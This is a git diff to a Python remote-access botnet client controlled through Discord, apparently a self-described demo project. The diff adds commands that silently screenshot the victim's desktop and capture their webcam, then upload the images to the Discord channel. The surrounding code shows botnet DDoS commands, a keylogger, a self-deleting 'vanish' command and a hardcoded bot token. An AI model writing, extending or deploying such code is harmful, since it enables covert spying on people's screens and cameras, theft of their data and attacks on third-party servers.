@@ -15,6 +15,8 @@ import discord
 import getpass
 import random
 import threading
+import pyautogui
+import cv2
 
 # putting my API token here I can regenerate and invalidate this one it if this code is ever leaked and used malliciously.
 TOKEN = "ODM0OTA2MDQ1MDYyMTg0OTkx.YIHs2A.fqZvw5tlT9NLBCVtczXVKfmrNNY"
@@ -25,7 +27,7 @@ activated = False
 #variable to flag to close dos threads and logger.
 closeDDOS = True
 closeLogger = True
-controllerVersion = "V1.0"
+controllerVersion = "V1.1"
 
 #May not implement this in the end as there is no reasonable reason to do this for demo purposes.
 #Might do it anyways because it'd be cool.
@@ -77,6 +79,12 @@ async def drop(ctx):
     global activated
     activated = False
 
+#activates all bots
+@bot.command("all")
+async def all(ctx):
+    global activated
+    activated = True
+
 #command for directing controller to open new socket connection
 @bot.command("servsoc")
 async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
@@ -99,12 +107,24 @@ async def stoplog(ctx):
     if activated:
         await ctx.send(f"{botID} has stopped listening...")
 
-#command to scan common cookie directories and send them
-@bot.command("getcookies")
-async def getCookies(ctx):
+#screenshots user desktop
+@bot.command("ss")
+async def ss(ctx):
     global activated
     if activated:
-        await ctx.send(f"Enjoy your cookies boss!")
+        ss = pyautogui.screenshot()
+        ss.save('secretsauce.png')
+        await ctx.send(file=discord.File('secretsauce.png'))
+
+#screenshots user webcam
+@bot.command("camshot")
+async def ss(ctx):
+    global activated
+    if activated:
+        cam = cv2.VideoCapture(0)
+        good, pic = cam.read()
+        cv2.imwrite('secretsauce.png', pic)
+        await ctx.send(file=discord.File('secretsauce.png'))
 
 #command to start entire botnet ddos at target
 @bot.command("firelaser")
@@ -118,7 +138,7 @@ async def fireLaser(ctx, TARGET, TPORT):
 #command to stop entire botnet ddos at target
 @bot.command("ceasefire")
 async def ceaseFire(ctx):
-    await ctx.send(f"{botID} has stopped attack on {TARGET}:{TPORT}")
+    await ctx.send(f"{botID} has stopped attack")
 
 #command to have application delete itself.
 @bot.command("vanish")
